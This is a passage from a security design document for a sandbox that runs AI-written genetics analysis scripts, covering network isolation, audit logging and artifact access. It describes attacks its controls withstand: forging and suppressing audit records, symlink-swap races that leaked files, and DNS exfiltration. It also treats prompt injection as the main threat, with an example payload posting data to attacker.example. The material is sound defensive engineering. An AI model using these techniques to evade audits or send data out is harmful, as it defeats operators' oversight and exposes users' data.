  exists at all — and **limit and quota values** (e.g. the per-execution row and byte caps).
  The examples are illustrative, not a list. An exhaustive enumeration has been attempted
  twice in this passage and was incomplete both times, so the categories are the claim and a
  reader who needs the current residue should diff the tool's real output rather than trust a
  list here. No credential **values** are exposed, and view names are separately obtainable
  through `get_database_schema`, which is registered.
- **Closing the residue is a separate decision, not a follow-up here.** The only way to
  remove it is to edit the SDK's own docstrings, which changes what a sandboxed script reads
  when it introspects the SDK and drifts the generated `sandbox/stubs/*.pyi` against their
  source. That trade — MCP-side disclosure against in-sandbox documentation quality — is not
  `4h6.16`'s to make silently.

**A warning, not a reinforcement: `TOOL_PROFILE` provides no protection here, and the
intuition about it is backwards.** An earlier draft offered "the `code` `TOOL_PROFILE` is a
chat-backend profile only and is never selected by the standalone MCP server" as a second
control. The opposite is true. In
`genetics-mcp-server/src/genetics_mcp_server/tools/definitions.py`, `get_anthropic_tools`
treats `tool_profile=None` as **no filtering — every tool**, and `mcp_server.py` calls
`register_mcp_tools(mcp, executor, disabled_tools=_mcp_disabled)` with no profile argument
at all. So "the MCP server does not select the `code` profile" is *precisely the condition
under which `run_analysis` would be registered*. Membership of `_mcp_disabled` is the
**sole** registration-layer control, not one of two — which is why layers 2 and 3 are not
optional.

Two further hazards for `4h6.16`:

- There is **no `code` profile today**. It is created by this work; nothing about it can be
  cited as an existing control.
- `TOOL_PROFILES.get(profile, {"general"})` **silently degrades an unknown profile name**
  to the default set rather than raising. A typo at any call site — `"code "`, `"codes"`,
  a renamed constant — produces a running server with a quietly different tool set and no
  error anywhere. If profile selection is ever load-bearing for a security property, that
  `.get` default must become a raise first.

### Layer 2 — NetworkPolicy (`4h6.8`)

The sandbox's ingress rule admits `app: chat-backend` only. mcp-server is denied at the
network layer.

**Shipped in `4h6.8`** as `allow-ingress-sandbox` in `k8s/network-policies/sandbox-policy.yaml`,
with an **offline** guard in `scripts/test-network-policies.py`. Because NetworkPolicies are
additive, "mcp-server cannot reach the sandbox" is a property of every file in
`k8s/network-policies/` at once, so the guard parses them all and asserts that no rule
selecting `app: sandbox` admits `app: mcp-server` — including via a from-less rule, which
admits everything. That guard runs with no cluster and no network — the harness's single cluster
call is elsewhere, in the `SANDBOX_ENABLED` check's live-sandbox probe — which is the only kind of test
available before `4h6.7` and `4h6.10` deploy anything. **The live connection test from the
mcp-server pod to the sandbox Service is deferred to the deploy window** and tracked as
`genetics-results-suite-4h6.26` with the other post-deploy verifications; it has not been run.

**What layer 2 does and does not guarantee.** It guarantees that *mcp-server cannot open a
socket to the sandbox*. It does **not** guarantee that an MCP client cannot cause code to
execute: `policies.yaml` admits `app: mcp-server` to chat-backend on 8000, mcp-server holds
both `INTERNAL_API_SECRET` and `CHAT_BACKEND_URL`, and chat-backend is the one pod the
sandbox admits — so the network layer closes `mcp-server -> sandbox` but leaves
`mcp-server -> chat-backend -> sandbox` open at the network level by construction. That
transitive path is held shut by layer 1 (the tools are never registered on mcp-server, so
no MCP call names them) plus chat-backend's route-level authorization, not by this policy.
Read layer 2 as a hop-level control, not a capability-level one.

### Layer 3 — a test (`4h6.16`)

`tests/test_mcp_server.py` asserts that `run_analysis` and `read_artifact` are absent from
the **actual `/mcp` tool list** — enumerated from the live `FastMCP` instance, not by
inspecting the `_mcp_disabled` constant. Asserting on the constant tests that someone typed
the name; asserting on the tool list tests that the registration path honoured it, which is
the property that matters. The test must also fail if the tools appear via
`register_proxy_tools` from an external MCP server.

The same test module must additionally assert that **mcp-server's HTTP application exposes
no route that reaches the sandbox client**. The MCP tool list is not the only surface:
`chat_api.py` and `routers/` ship inside the same image and are mounted on the same app, so
a sandbox client imported for one entry point is reachable from all of them. Enumerate the
app's routes and assert that none of them dispatches to the sandbox client — by import
graph if a route-level assertion is impractical. A tool excluded from `/mcp` but reachable
at `POST /chat` is the same failure with a different URL.

### Why layer 1 alone is insufficient

Three independent reasons:

1. **`_mcp_disabled` is assembled at runtime from mutable inputs.** It is the union of an
   env-driven `_settings.disabled_tools` and a hardcoded set. There is a second
   registration path in the same file — `register_proxy_tools` for external MCP servers,
   filtered by a *different* set (`EXTERNAL_MCP_EXCLUDE_TOOLS`). A name omitted from a
   registration list is one refactor away from being re-registered.
2. **mcp-server's reachability is broad.** It is not behind oauth2-proxy. It accepts
   `MCP_API_KEY` shared secrets, Google Identity Tokens (and `GOOGLE_TOKEN_AUDIENCE`
   defaults to the *gcloud CLI's* OAuth client id, which anyone with a Google account can
   mint against — the email allow-list is the actual gate), per-user chat API tokens, and
   Keycloak OAuth 2.1 tokens from separately registered third-party clients such as
   brainzzz. The set of parties who can drive mcp-server is larger than the set who can use
   the browser.
3. **The precedent is already documented in this repo.** `docs/project-spec.md` records
   that mcp-server sits on both sides of the `allow-ingress-db-api` policy, so "anything
   that could drive mcp-server could reach BigQuery behind it". The same shape applied to
   code execution would mean anything that could drive mcp-server could run code. The fix
   there was to add an authentication layer *in addition to* the network layer; the fix
   here is the same instinct applied before the fact.

With all three layers, the worst case from a registration mistake is that a tool appears in
the MCP tool list and every invocation fails with a connection error — noisy, visible, and
not code execution.

---

## 6. Abuse cases and the control that stops each

### 6.1 Crypto mining / CPU burn

**Controls, in order of effect:** no internet egress, so there is no pool to join and no
payload to download — a miner needs both. CPU `limits: 1500m`. Wall clock 60s default /
120s hard, not model-overridable. `pod_pids_limit: 1024`, with the supervisor's own child pid
budget far below it. Concurrency 1 with a queue, so a
loop of submissions serializes rather than multiplying. Nothing executable persists:
`/scratch/<id>` is deleted on completion except for the artifacts subdirectory, which is
inert data on a 15-minute reaper (see the `read_artifact` subsection); the root filesystem
is read-only; there is no pod-level `/tmp`; and there is no cron, no PVC and no service
account token, so a miner cannot survive the 120-second ceiling.

**Worst case if all of that is exercised deliberately:** 1.5 cores for 120 seconds at a
time on a node that exists solely for this. That is a wasted node, not an incident.

### 6.2 Data exfiltration via db-api

This is the honest one, and it needs the question framed correctly. A script can
legitimately issue arbitrary SQL against the views — that is the entire feature. Bulk
extraction is not preventable by restricting the query.

What *is* preventable is data leaving the user's own conversation. The controls:

1. **There is no sink** — and this claim depends on the no-DNS decision in section 3. The
   only two ways bytes leave the pod are stdout (capped at 64 KiB to the model, 8 MiB from
   the pipe) and `/scratch` (512 MiB, retrievable only over the chat-backend-only ingress
   path and only as **image artifacts**, at most four per run and 512 KiB each, fetched by
   chat-backend against an `execution_id` it minted for the submitting session — see
   `GET /artifact` in section 2 and the `read_artifact` subsection below). Both sinks are
   therefore bound to the chat session that submitted the script, and neither is addressable
   by the script itself. No internet egress, no PVC,
   no other service, **and no DNS**: with kube-dns egress allowed this claim would be
   false, because subdomain-label encoding sustains roughly 200 KB/s and needs no response
   (section 3, "On DNS"). If DNS is ever restored, this control is downgraded from "no
   sink" to "a bandwidth-limited sink", and must be reworded here.
2. **Byte and row caps** (section 4): on db-api, 50 GB per query, **200 GB aggregate per
   `jti`** across all four of its BigQuery paths, and 25 000 response rows; on results-api, a
   16 MiB response-byte cap, no row cap, and per-`jti` aggregate bytes (1 GiB), request count
   (1000) and concurrency (4, and 8 pod-wide) — all as defaults, not as a sandbox-only penalty. A
   full-table dump fails rather than succeeding slowly, and a loop of medium queries hits the
   aggregate budget on either service rather than running for the full 120 seconds.
3. **The SDK records what it reads — the trail is attributable, and it is now collected.**
   Every `GeneticsClient` coroutine method and every `genetics.<fn>` sync
   wrapper emits one structured line carrying function, argument summary and row count
   (`4h6.12`), and db-api logs `sid`, `sub` and `jti` per request. Four limits, all present
   in the code today, and none of them cosmetic:
   - **WHICH IDENTITY IS AUTHORITATIVE, since two are rendered.** The SDK renders
     `[user=…] [session=…] [execution=…]` per call from `SANDBOX_USER`, `SANDBOX_SESSION_ID`
     and `SANDBOX_EXECUTION_ID`, which the supervisor does set in the child's environment from
     the token's `sub`, `sid` and `jti` (`supervisor.py`, `ExecutionDirs.child_env`) — an
     earlier draft of this file said nothing set them and all three rendered `unknown`, which
     is out of date. **On the collected path that prefix is not what attributes the record.**
     The supervisor discards it and re-stamps from the same claims on the read end (`4h6.45`),
     because the child owns its environment and can rewrite all three between two calls. **The
     environment prefix and the signed claims are not the same evidence**, and only the second
     one leaves the pod. Both halves of token delivery have landed — the supervisor writes the
     token file and names it in `SANDBOX_TOKEN_FILE` (`4h6.43`), the SDK reads and unlinks it
     and sends the audience-bound token (`4h6.44`) — so db-api's and results-api's
     `endpoint_access` lines carry the same three values from the token itself, and the join
     across the three sinks closes on one `jti`.
   - **The lines now reach a collector.** The cluster's logging agent collects the *pod's*
     stdout, and `4h6.45` forwards the re-framed records there (locally: the container's
     stdout, where `scripts/run-sandbox-local.sh --logs` shows them). Before it, the child's
     streams went into the supervisor's pipe and nothing forwarded them, so the control
     produced records nothing ingested.
   - **The fd never separated the records from the *script*, and still does not — the
     supervisor does.** The fd number must be in the child's environment for the SDK to find
     it, so `os.write(int(os.environ["GENETICS_SDK_AUDIT_FD"]), …)` puts arbitrary bytes
     straight on it. What changed is what happens next: every line is matched whole against the
     record shapes and re-emitted under the supervisor's stamp, so a child can still *write*
     anything but cannot get a forged identity, a broken frame or chosen prose past the read
     end. Measured: a rewritten `SANDBOX_USER` plus a hand-written `[user=admin@finngen.fi]`
     prefix reached the container's stdout as `[user=dave@finngen.fi]`, with the forged string
     nowhere in the log. On a **shared** stream — anything that is not this fd — none of that
     holds: a forged line parses cleanly through this repo's own parser under any user it
     likes, and per-value escaping is irrelevant when the writer owns the stream. The SDK emits
     a once-per-process warning saying so, in the stream itself, and
     `scripts/analyze_conversations.py` repeats it in any report built from such a log; a
     report built from a sandbox log should never carry it.
   - **`_executor` calls are not audited at all.** Instrumentation sits on the curated
     surface; `get_client()._executor.<method>()` is one attribute access away from a
     sandboxed script and returns the same data with no line emitted (`4h6.33`). So this is
     "audited if you use the recommended surface", never "unbypassable" — false in
     principle, not only in deployment.

   Three further properties are deliberate rather than gaps. **The bound applies only to
   refusals** — calls that never reached the executor — capped at `_AUDIT_MAX_REFUSALS = 1000`
   per *process*, after which they are dropped and one "SDK audit truncated" notice is
   emitted. A call that reached the executor is **never** dropped. Both halves are corrections
   to an earlier revision that capped everything at 1000 per *execution*: that ceiling was
   keyed on `SANDBOX_EXECUTION_ID`, which the script writes, so rotating it restored the flood
   at 19,622 lines/s and 2.58 MB/s — *higher* than the 18,088 lines/s before the ceiling
   existed, because each rotation also bought a truncation announcement. And the ceiling was
   itself a suppression primitive: ~50 ms of refusals, which touch no network at all,
   exhausted the budget, and every genuine `sql()` read afterwards emitted nothing. Silent
   suppression on demand is strictly worse than a noisy flood. Hence the split — a refusal is
   free to the caller and worth bounding, while a call that reached the executor already paid
   an HTTP round-trip and is charged against the byte and row quotas the other controls rely
   on, so it cannot be driven at flood rates. Measured after the change: a refusal flood *with*
   id rotation settles at 0 lines/s steady-state, and 5,000 refusals followed by 25 real reads
   records 25 of 25. **The identity fields are sanitised** on the same terms as arguments,
   which they previously skipped: `SANDBOX_USER = "alice\n[user=admin@finngen.fi"` rendered a
   line the shipped parser read back as `user='admin@finngen.fi'`, and a 100 KB value put
   100,431 bytes on the stream from one legitimate call. Both are charset- and length-checked
   now, and a failing value is *replaced* by `<invalid>` rather than truncated into something
   plausible — the forgery renders `user='<invalid>'`, and the 100 KB case emits 197 bytes.
   **The argument summary answers "how much", not "what"** for the most powerful calls:
   `sql()` bodies render as `<str:N>` and every list argument as `<list:N>`, deliberately, so
   a script cannot write chosen text into an operator's log. Row count is the only content
   signal that survives there.

   **No IN-PROCESS mechanism can make these records trustworthy, which is why the enforcement
   is not in-process.** A validator defeated every control inside the SDK from inside the
   sandbox: forging records by calling
   `logging.getLogger("genetics_mcp_server.sdk.audit").info(...)` directly and by `os.write`
   to the audit fd number the script reads from its own environment, and suppressing them via
   `logger.disabled`, the level, a filter, and handler removal. As long as the audited code
   and the audit emitter share an address space this is the consequence of where the code
   runs, not a list of gaps to patch one by one — a dedicated fd separates the stream from
   stdout, not from the script. `4h6.45` moved the enforcement out of the process: the
   *supervisor* reads the fd and applies the rate, byte and per-line caps on the read end where
   the child cannot reach them; the *supervisor*, which holds the sandbox token, stamps
   `[user=…] [session=…] [execution=…]` from its `sub`/`sid`/`jti` claims instead of asking the
   child who it is; and the child's framing is untrusted input, re-parsed and re-framed before
   anything is recorded. **What that buys is precise, and it is less than "trustworthy
   records": attribution and framing, not truth.** A script can still emit well-formed records
   for calls it never made, `_executor` reads are invisible to all of this, and a child can
   still lose its own later records by flooding its own pipe — bounded, counted and announced
   when the *supervisor* is the one dropping them. **The four in-process suppression mechanisms
   above are untouched by `4h6.45` and remain completely silent**: they stop the bytes before
   the fd, so the supervisor sees an empty stream and says so with the same `records=0` summary
   an execution that made no SDK calls produces. The read end bounds what a child can *write*
   to an operator, not what it can *withhold*. It also says nothing about a `setsid()` escapee or a child reading
   `/proc/self/mem`: `4h6.55` bounds those and nothing here does. For "what did that script
   actually read, under an assumption of compromise", the answer remains db-api's and
   results-api's `endpoint_access` lines, written outside this pod.
4. **The sandbox grants no data the caller lacked.** The same user can already query the
   same views through the existing tool surface. The sandbox changes the *shape* of
   access, not its scope.

So the residual is: an authorized user extracts, into their own chat window, data they were
already authorized to see — 64 KiB at a time. That is unchanged from today and is not a
regression. The thing the design *does* prevent is that data reaching a third party without
passing through the user's authenticated session.

**That conclusion survives control 3's state, but only half of it does — stated because an
earlier draft leaned on the other half.** The residual above rests on controls 1, 2 and 4,
which are unaffected: no sink, capped bytes and rows, no data the caller lacked. What does
*not* follow any more is "a dump is visible after the fact and attributable to a person and a
conversation" — the earlier wording of control 3, and false in every part. Attribution is the
axis on which the sandbox is a **regression** rather than a wash: the same reads through the
existing MCP tool surface already carry the user and the session in chat-backend's
`Executing tool:` lines, and script-driven reads did not, so enabling the sandbox ahead of
token delivery and audit forwarding (see section 4 on `SANDBOX_ENABLED`) would have bought a
query path whose "who ran that?" is unanswerable. It is still *bounded* — nothing leaves the
user's own session, nothing new is reachable. Both halves have now landed. Token delivery:
the supervisor writes the read-once file (`4h6.43`) and the SDK reads it and sends the
audience-bound token (`4h6.44`), so db-api's and results-api's `endpoint_access` lines carry
`sub`, `sid` and `jti` from the signed token. Collection: the supervisor reads the audit fd,
caps it on the read end, re-frames every record and stamps it from those same claims onto the
pod's stdout (`4h6.45`), so the sandbox's own records now reach a collector and join to the
upstream ones on `jti`. **The remaining limit is not collection, it is what a record proves.**
Under an assumption of compromise the SDK's records still do not establish what a script did —
the script and the emitter share a process, so it can write well-formed records for calls it
never made and read data through `_executor` with no record at all. So: cite the SDK records
for "what did a well-behaved script read", cite the supervisor's stamp for "whose execution
was that", and cite `endpoint_access` for anything that has to hold against a hostile one.

### `read_artifact` (`4h6.15`): lifecycle, authorization, and the path allow-list

`read_artifact` was under-specified in an earlier draft to the point of being three
separate holes, and both 6.2 and 6.4 lean on it. It is specified here.

**Retention — resolving the lifecycle contradiction.** Section 2 says `/scratch/<id>` is
deleted on completion; 6.2 and 6.4 both depend on artifacts being retrievable *after*
completion. As written the tool could never return anything, and an implementer who
resolved that by simply keeping the directory would silently invert the "nothing persists"
property that 6.1 and 6.4 assert. The rule:

- On completion, the supervisor deletes everything under `/scratch/<id>` **except**
  `/scratch/<id>/artifacts` — the one subdirectory the SDK writes named outputs into.
  Working files, temp, `HOME`, caches and any inputs go immediately.
- `/scratch/<id>/artifacts` is retained for **15 minutes** from completion, then deleted
  unconditionally by the supervisor's reaper, whether or not it was ever read. Fifteen
  minutes is longer than any plausible same-turn retrieval and far shorter than a session.
- **The 15 minutes is a floor, not an instant.** Deletion happens on a reaper tick and the
  reaper polls every 30 s (`REAPER_POLL_S`), so a directory is present until the
  deadline and gone by **deadline + 30 s**; in between it may be either. Tightening the poll
  narrows the window without closing it, and polling is also what catches orphans the retention
  registry has no row for, so the window is stated rather than engineered away. **Anything
  asserting this boundary** — `4h6.49` is instructed to — must assert presence at some
  `t < TTL` and absence only at `t >= TTL + 30 s` plus its own margin, driving it with the
  `SANDBOX_RETENTION_S` override; the override shortens the TTL but **not** the poll, so the
  30 s term stays 30 s however short the TTL is made.
  **The presence half of that assertion holds only while nothing else is retaining
  concurrently.** Presence until the deadline is not unconditional: a *later* completion that
  pushes the retained aggregate over the 256 MiB ceiling makes `_enforce_retained_ceiling`
  evict oldest-first, and `_forget_retained` deletes a directory **before** its deadline. So
  the boundary is "present until the deadline **unless the retained ceiling evicts it first**,
  gone by deadline + 30 s". A test asserting presence at `t < TTL` must therefore be the only
  thing retaining for the duration of that window — one execution, or a total well under the
  ceiling — or it is asserting against a directory another execution is entitled to delete.
  `scripts/test-supervisor.py`'s
  `test_retention_expiry` already does exactly this — `retention_s + REAPER_POLL_S + 2` against
  a container, `reap_expired()` called directly in-process — and is the shape to copy.
- Retention does not survive a pod restart, and the supervisor wipes unrecognised
  `/scratch` entries at startup (section 2, Writable paths).
- So "nothing persists" is now precise: **nothing persists beyond 15 minutes, and nothing
  is ever readable by a different chat session** (next point). Sections 6.1 and 6.4 are
  worded against that.

**Authorization — the execution id is not a secret.** 6.2 asserts artifacts are retrievable
"by the same authenticated session that submitted the script" and an earlier draft gave no
mechanism for it. Execution ids are unguessable but *not* confidential: the execution id is
the token's `jti`, it appears in db-api's structured logs, in the SDK instrumentation, and
in the model's own context — from where a prompt injection can read it back out. Knowledge
of the id must therefore confer nothing. The mechanism:

- `read_artifact` takes an artifact **name** (e.g. `"manhattan.png"`), never a path and
  never an execution id supplied by the model or the operator.
- chat-backend resolves that name **server-side**, against the set of executions it recorded
  as belonging to the **requesting chat session** — the `sid` it minted the token with, taken
  from the authenticated request, not from any tool argument.
- An artifact belonging to another session is `404`, indistinguishable from a name that does
  not exist.

**`run_analysis`'s response contract, because the resolution above depends on it.**
chat-backend can only resolve a name against "executions it recorded" if the execution told
it what it produced. So `run_analysis`'s response is specified here rather than left to
the task that implements the tool (`4h6.48`), and it is **not** implemented anywhere today:
alongside the 64 KiB stdout/stderr and the exit status it returns an **artifact
manifest** — for each file under `/scratch/<id>/artifacts`, its `name`, `size` in bytes, and
`content_type`. chat-backend records that manifest against the execution's `jti` and `sid`
and serves `read_artifact` from it; the model sees the manifest and so knows what names are
retrievable without guessing. The manifest carries **no paths and no execution id** — the
same reason `read_artifact` takes a name.

**A quota kill deletes artifacts NEWEST-FIRST, and that is visible to whoever reads the
manifest.** When `artifacts/` is over its 64 MiB / 1024-entry quota the supervisor trims it
back after the kill, and the victim order is mtime-descending with no size awareness: the entry
being written when the kill landed is assumed to be the culprit. That is right for the case the
trim exists for and wrong for an ordinary one — a script that writes a 100 MiB CSV **first** and
then fifty small plots loses the fifty plots first, and then loses the CSV too, because no
number of plots brings a tree under a quota one file alone exceeds. The policy is kept anyway:
a size-aware pass would delete the large output the user actually asked for and keep incidental
ones. The consequence a client must handle: after `status: "limit"` with
`error.type: "ArtifactQuota"` the manifest can be **short or empty** even though the script
wrote those files successfully, so a name the model can see in its own code may simply not be
offered, and asking for it is a legitimate `404`. The manifest never *lies* — the trim runs
before it is built, precisely so it cannot advertise a name that is already gone, and the
deletions are folded into `artifacts_omitted`. **That field is a combined floor, not a trim
counter.** It is `omitted + trimmed`: `build_manifest`'s own omissions (entries it could not
`stat`, or that were not regular files with `st_nlink == 1`) plus the trim's deletion count,
and the first half stops being a count of its own past the scan limit — beyond that the
directory is no longer enumerated and the supervisor logs that `artifacts_omitted` is a floor.
A client can read it as "at least this many names are missing", never as "the trim deleted
exactly this many". Nothing here is a budget violation — the
retained tree ends up under the quota either way — so it is a behaviour to describe, not a bug
to fix.

**Name collisions across executions in one `sid`: most recent wins.** Two executions in the
same session can both write `manhattan.png`, and the resolution rule above ("executions
belonging to this `sid`") is ambiguous without a tiebreak. The rule: `read_artifact`
resolves a name to the artifact from the **most recently completed execution in that `sid`
that produced it and is still within its 15-minute retention window**. Rationale — the model
asks for an artifact it has just been told about, and the freshest is what it means; a
stale-first rule would silently return a previous turn's plot for the same name, which is a
wrong-answer failure rather than a loud one. Older same-name artifacts remain on disk until
their own reaper deadline but are not addressable. If a future version needs to reach them,
that is a new argument on the tool, not a change to this default.

**Path allow-list — do not reuse `SUBAGENT_ALLOWED_PATHS`.** Section 1 keeps
`_validate_path` because it is sound against `..` and symlink escape. It is sound *given a
correct allow-list*, and the allow-list its existing caller reads is the trap:
`SUBAGENT_ALLOWED_PATHS`, which `k8s/deployments/chat-backend.yaml:117` sets to `/data` —
the chat-data PVC mount holding `chat_history.db` and `llm_config.db`, the exact assets
section 1 calls the crown jewels. An implementer who wires `read_artifact` into chat-backend
against the existing environment variable, because that is what the existing helper reads,
hands the model a read primitive over **every conversation in the deployment**. Therefore:

- `read_artifact` **never reads the local filesystem in chat-backend.** It proxies over HTTP
  to the sandbox pod, on the same chat-backend-only ingress path as `run_analysis`.
- The `_validate_path` call happens **inside the sandbox pod**, with the allow-list
  `/scratch/<id>/artifacts` for the single resolved execution — not `/scratch`, not
  `/scratch/<id>`, and under no circumstances `SUBAGENT_ALLOWED_PATHS`.
- chat-backend's `SUBAGENT_ALLOWED_PATHS` is untouched by this work and gains no new reader.
  `ENABLE_SCRIPT_EXECUTION` stays `false` (section 1), which is what makes that variable
  inert today; `read_artifact` must not be the thing that makes it live again.

### As built (`4h6.15`) — the read is descriptor-based end to end, the allow-list is structural, scoping is not there yet

Everything above this subsection that is not repeated here is still design. What exists is
`ToolExecutor.read_artifact`, `ToolExecutor._open_artifacts_dir` and
`ToolExecutor._artifacts_dir` in
`genetics-mcp-server/src/genetics_mcp_server/tools/executor.py`, plus
`_ARTIFACTS_DIR_PREFIX` in the same file.

**Two descriptors, and every decision taken off an `fstat`.** The name is checked before the
filesystem is touched (rejects `.`, `..`, separators, backslashes, NUL, absolute paths, and
anything where `Path(name).name != name`), then `_validate_path` re-checks the resolved path
against the single-entry allow-list. Both of those are advisory: both answer a question
about a *path*, and the executing code owns the directory — under the decided option (b) it
runs as the pod's single uid 65532, the very uid that created `/scratch/<id>`, so it owns that
directory *a fortiori*, without any chown being needed. The enforcing layer is a pair of
descriptors:

1. `_open_artifacts_dir()` opens the configured directory **once** with
   `O_RDONLY | O_DIRECTORY | O_NOFOLLOW`, then verifies the **descriptor** rather than the
   path by reading `/proc/self/fd/<dirfd>` — the kernel's own name for the inode that fd
   holds. That name must start with the hardcoded prefix and must **not** end in the
   kernel's `" (deleted)"` suffix. It fails closed to `None`.
2. The artifact is then opened as a **bare name relative to that fd**,
   `os.open(name, O_RDONLY | O_NOFOLLOW | O_NONBLOCK, dir_fd=dirfd)`. `S_ISREG`, the
   link-count check, the size check and the chunked `os.read` loop all run against that one
   file descriptor. After `_open_artifacts_dir` returns, nothing addresses anything by path.

**The lesson is why the shape looks like this.** The first version validated a path and then
re-opened it, and a validator won that race 825 times in 6,000 calls. The fix — open once
with `O_NOFOLLOW` — was then re-attacked and found to be the *same* defect one level up:
`O_NOFOLLOW` guards only the **final** component, and `artifacts` is an **intermediate**
component the child owns. `rmdir`-ing it and relinking it at another execution's retained
artifacts between the check and the open leaked out-of-tree content **151 times in 20,000
iterations (0.76%)**. `_validate_path` was no help at all there: it resolves both sides
through the same swapped link, so they agree and it passes. The real defect was never the
missing flag — it was **addressing anything by path after checking it**, and fixing that at
one level only relocated it to the next. Re-attacking the descriptor form gave **0 leaks in
40,000 iterations** across two swapper profiles, and the deterministic control that
previously returned out-of-tree content now refuses.

Three properties follow from taking the answer off descriptors:

- The `" (deleted)"` refusal is load-bearing, not hygiene. `rmdir` followed by re-creating a
  directory at the same path with planted content is refused, because the fd still names the
  deleted inode and the kernel says so.
- `O_NONBLOCK` on the file open is a control, not tidiness. `O_RDONLY` on a FIFO with no
  writer blocks **in the kernel**, before `S_ISREG` is ever reached, so a script doing
  `os.mkfifo(artifacts/results.tsv)` hangs the calling coroutine — and with it chat-backend
  — indefinitely. That is a trivial in-sandbox denial of service, and it hung a validator's
  own harness for about four minutes before the flag was added. Such a name is now refused
  in under a millisecond, by `S_ISREG` after the non-blocking open. The flag is inert for
  regular files, which are all that survives that check.
- `st_nlink != 1` refuses hardlinks. Path resolution could never have caught this one at
  all: a hardlink has nothing to resolve, so both path-based layers see an in-tree path over
  an out-of-tree inode and pass. Stating it here means the property does not depend on
  `fs.protected_hardlinks` being set on the node.

Failures are uniform: a resolution failure, a symlink, a hardlink, a non-regular file, a
directory that fails descriptor verification and a missing name all return the same
`Artifact not found`, so which names exist outside the allow-list is not learnable by
probing. An oversized file is refused rather than truncated, and the error deliberately
omits the byte count.

**The allow-list root is checked structurally, and every check fails closed.**
`_artifacts_dir()` returns `""` — meaning artifact reads are simply not enabled — unless the
configured directory passes both:

- **It may not itself be a symlink** (`lstat`, `S_ISLNK`). This is reachable, not operator
  error. `/scratch/<id>` is created and written by uid 65532, and under the decided option (b)
  the child runs as that same uid — it owns the directory outright rather than by a chown, so
  the swap is at least as reachable as it would be under (a). The child can `rmdir` its own
  `artifacts` and relink the name at another execution's retained artifacts; because
  `_validate_path` resolves both sides, *every* file under that target would then validate.
  That is precisely the cross-execution channel 6.4 exists to prevent. Note that this check,
  like `_validate_path`, is a path answer and therefore advisory — `_open_artifacts_dir`'s
  `O_NOFOLLOW` on the directory open is what actually holds it, at the moment of use.
- **Its resolved path must sit under a hardcoded `/scratch/` prefix**
  (`_ARTIFACTS_DIR_PREFIX`, patched only by tests), and `_open_artifacts_dir` re-asserts the
  same prefix against the descriptor. The prefix is what makes the chat-backend
  misconfiguration *unreachable* rather than merely unmade: `read_artifact` is registered in
  the chat backend, chat-backend has no `/scratch` volume and never will, so
  `SANDBOX_ARTIFACTS_DIR=/data` — the PVC holding `chat_history.db` and `llm_config.db` —
  cannot resolve. Before the prefix existed, a single env var staying unset was the entire
  safety property. `SUBAGENT_ALLOWED_PATHS` gains no reader here; `_artifacts_dir` is its
  own variable for exactly the reason the allow-list subsection above gives.

**A stated limitation: the prefix check is a *location* check, not an *ownership* one.** It
proves the descriptor names an inode under `/scratch/`; it does not prove that inode is
*this* execution's artifacts directory. Point `SANDBOX_ARTIFACTS_DIR` at some other
directory that happens to sit under the prefix and its contents are readable. This is not
reachable from a sandboxed script — it requires control of the parent process's environment
— and it is the same gap the scoping paragraph below describes, but it is worth stating
outright rather than leaving implicit in "the env var points at the right directory".

**Cross-execution scoping is not implemented.** The tool takes a bare artifact name and
nothing else — there is no session argument, no execution argument, and no server-side
resolution of a name against the executions belonging to a `sid`. Which execution's
artifacts are reachable rests **entirely** on `SANDBOX_ARTIFACTS_DIR` pointing at the right
directory, constrained only by the structural checks above. The authorization mechanism
specified earlier in this section and the manifest that name resolution would consult are
still design, and belong to `genetics-results-suite-4h6.52`. They were never `4h6.11`'s —
that task is closed and did not do them, so do not read its state as evidence any of this
landed. Until `4h6.52` lands, the retrievability claims 6.2 and 6.4 lean on are met by
deployment configuration, not by code.

**What `genetics-results-suite-8z1` did and did not change here.** The HTTP path from
chat-backend to the sandbox pod now exists — `GET /artifact`, specified in section 2 — but
`read_artifact` **does not use it** and is unchanged: it still reads
`SANDBOX_ARTIFACTS_DIR` locally and still tells the model it cannot reach a `run_analysis`
artifact. The only caller of the new route is `_fetch_analysis_images`, which resolves the
`execution_id` server-side from the run it just performed and fetches image artifacts
automatically. So the route removes the "there is nowhere to proxy to" blocker for `4h6.52`
without touching the tool or its scoping gap.

**Deployment note — an availability concern, not a security one.** `_open_artifacts_dir`
verifies the descriptor through `/proc/self/fd/`. If the sandbox pod ever runs with a masked
or otherwise restricted `/proc`, the `readlink` fails, the function fails closed, and
`read_artifact` refuses **everything** — correct behaviour, but a total loss of the feature
rather than a leak. Confirm `/proc/self/fd` is readable in the pod once, when
`k8s/deployments/sandbox.yaml` is written (`4h6.7`).

`read_artifact`'s exclusion from the MCP tool set landed with this change; see section 5,
layer 1.

### 6.3 Resource exhaustion starving chat-backend

**The control is physical separation, and it is the second reason for the dedicated node
pool.** The sandbox is the only pod tolerating `sandbox.gke.io/runtime=gvisor:NoSchedule`,
and chat-backend cannot schedule there. A script cannot contend for chat-backend's CPU,
memory, page cache or pids, because it is not on the same machine.

This also protects the constraint `docs/project-spec.md` documents at length. The figures
this paragraph used to quote (a pinned 2 × `e2-standard-4` pool overshooting one node at
3951m / 13.60 GiB) were **wrong on both the pinning and the arithmetic** — see
`genetics-results-suite-262`. Re-derived: the primary pool autoscales 1-3, and a full deploy
peaks at 3226m / 12498 Mi (finngen) or 3826m / 13778 Mi (daly, as deployed by default) against
3920m / 13273 Mi allocatable — so daly is over by 505 Mi and already needs a second node on
memory (daly with `ENABLE_RAG=true` is over on both axes at 4076m / 14290 Mi), while finngen
fits with 775 Mi of margin.
The sandbox adds nothing to that budget either way, which is why `4h6.10` adds a pool rather
than re-sizing the primary one.

Secondary controls, in case the sandbox is ever moved onto the shared pool: `requests`
equal to steady-state need, `limits` bounded well under one node, replicas 1.

### 6.4 Prompt-injected scripts

**This is the primary threat, not an afterthought.** Tool results and user-supplied file
attachments flow into the model's context. Sources that a third party can influence
include: myvariant.info and cBioPortal responses, MouseMine/MGI and UniProt payloads,
Europe PMC abstracts, Perplexity and Tavily results, proxied gnomAD and Open Targets MCP
tools, and any TSV or text file a user uploads. Any of these can carry a string that reads
as an instruction. The model has no reliable way to distinguish data from instruction, and
**this design does not assume it can.**

The controls, all of which work regardless of what the model was persuaded to write:

1. **No capability is granted by trust.** An injected script runs in exactly the boundary a
   benign script runs in — same uid, same read-only rootfs, same egress allow-list, same
   token. There is no privileged path to escalate into, because there is no privileged
   path at all.
2. **The classic payload has nowhere to go — because there is no DNS either.** "Query
   everything and POST it to `https://attacker.example`" fails at the NetworkPolicy; the
   only reachable hosts are db-api and results-api. This control was overstated in an
   earlier draft, which allowed kube-dns: the payload does not need a POST or a response,
